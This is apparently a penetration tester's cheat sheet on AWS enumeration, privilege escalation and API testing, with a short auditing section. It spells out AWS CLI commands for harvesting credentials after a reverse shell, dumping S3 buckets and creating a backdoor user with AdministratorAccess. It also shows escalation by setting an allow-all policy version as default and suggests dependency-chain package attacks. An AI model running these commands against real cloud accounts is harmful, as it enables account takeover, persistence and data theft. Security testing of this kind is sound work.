## AWS enumeration 


#### Get S3 buckets from public websites 

`aws --profile attacker iam put-user-policy --user-name enum --policy-name s3-read --policy-document file://policy-s3-read.json` <br/> 
"StringLike": {"s3:ResourceAccount": ["1*"]} 

Check that discovered user exists by trying to grant access to this user for an S3 bucket. 
> Use `pacu` to check if target account's IAM roles exist and if we can assume them. 

Check if origin access control is enforced, and block public access = on. 

---- 

#### Enumerating compromised profiles - run get-caller-identity first! 

Check if target profile can run lambda functions: <br/> 
`aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile` 


Check attached IAM policies, and group inheritance: <br/> 
`aws --profile target iam list-attached-user-policies --user-name clouddesk-plove` <br/> 
`aws --profile target iam list-groups-for-user --user-name clouddesk-plove` <br/> 
`aws --profile target iam list-attached-group-policies --group-name support` <br/> 
`aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8` (check version id first) <br/> 
`aws --profile target iam list-users | tee  users.json` (also groups, roles) 

---- 

#### Using JMESPath to query json data 

`aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[].UserName"` <br/> 
`aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].{Name: UserName,Path: Path,Groups: GroupList}"` <br/> 
> The results might have custom fields worth investigating further. 


## AWS pentesting 

1. Enum S3 dirs like normal, might have .git repos, jenkins etc, use `aws s3 sync` to get bucket (if dumping PII is within scope). 
2. Look for eg cloud formation templates to see what the user or IAM role has access to. 
3. When a rev shell is obtained, run `env | grep AWS` to grab aws creds and/or `printenv` for containers. 
4. Enum creds' permissions and create backdoor user, eg <br/> 
   `aws --profile CompromisedJenkins iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` 
5. Try dep chain hacks, eg uploading some '{package}-utils' and (re)installing on compromised instance or cicd/git. 
6. Scan the network for accessible resources and do lateral movement. 

**Auditing**: <br/> 
Use AWS security hub, IAM access analyzer, config to validate least privileges when mapping services to identities; <br/> 
Check CloudTrail logging for IAM role/policy changes, backdoor users created etc; <br/> 
Check if drift detection alerts are enabled if using terraform, eg admin policies added to random IAM roles. <br/><br/> 


**Privilege Escalation**: <br/> 
Check if any role has `iam:PassRole`, if a service can be configured use role eg `lambda:CreateFunction`, and if admin permissions can be attached. <br/> 
Check if there's `iam:CreateAccessKey` on *, or `iam:CreatePolicyVersion`. (Try Pacu or enumerate-iam.py) 
```json 
 "Effect": "Allow",
 "Action": ["iam:CreatePolicyVersion"],
 "Resource": "arn:aws:iam::*:policy/my-policy-only"
```
```bash
 # 1. Craft the malicious policy document locally
 cat > admin-policy.json << 'EOF'
 {
  "Version": "2012-10-17",
  "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
 }
 EOF
```
```bash
 # 2. Create the new version AND set it active in one call
 aws iam create-policy-version --policy-arn arn:aws:iam::<account-id>:policy/my-policy-only --policy-document file://admin-policy.json --set-as-default
```

---- 

## API pentesting 

- Endpoint discovery ~ wordlist fuzzing like /api/FUZZ/x, /api/product/1, 0, -1, INT_MAX 
- HTTP methods ~ check against spec, check if unintended methods get blocked (eg PUT vs POST for uploads) 
- Authentication ~ check bypass w/o token, expired tokens, alg:none etc 
- Authorization ~ use A's token in B's req, try to mod params like is_admin, balance, price, etc 
- BOLA ~ check whether user A can access user B's /api/orders/1001, 1002, ... 
- Business logic ~ check against spec, eg can user access /api/checkout before /api/add_to_cart 
- Rate limiting ~ check if spamming gets blocked 
> Establish baseline, test the above & compare behaviour, verify impact and document. 
